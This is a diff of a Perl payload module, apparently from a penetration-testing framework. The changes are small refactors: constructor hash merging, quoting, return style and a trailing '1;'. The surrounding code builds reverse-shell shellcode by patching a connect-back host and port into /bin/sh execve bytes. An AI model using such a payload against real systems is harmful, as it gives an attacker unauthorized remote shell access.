@@ -16,8 +16,11 @@ my $info =
 
 sub new {
   my $class = shift;
-  my $self = $class->SUPER::new({'Info' => $info}, @_);
-  $self->{'Info'}->{'Size'} = $self->_GenSize;
+  my $hash = @_ ? shift : { };
+  $hash = $class->MergeHash($hash, {'Info' => $info});
+  my $self = $class->SUPER::new($hash, @_);
+
+  $self->_Info->{'Size'} = $self->_GenSize;
   return($self);
 }
 
@@ -40,13 +43,13 @@ sub Generate {
   "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80";
 
   my $host_bin = gethostbyname($host);
-  my $port_bin = pack("n", $port);
+  my $port_bin = pack('n', $port);
 
   substr($shellcode, $off_host, 4, $host_bin);
   substr($shellcode, $off_port, 2, $port_bin);
   
   # $shellcode = "\x81\xc4\x00\xfe\xff\xff" . $shellcode;
-  return $shellcode;
+  return($shellcode);
 }
 
 sub _GenSize {
@@ -54,3 +57,5 @@ sub _GenSize {
   my $bin = $self->Generate({'LHOST' => '127.0.0.1', 'LPORT' => '4444',});
   return(length($bin));
 }
+
+1;
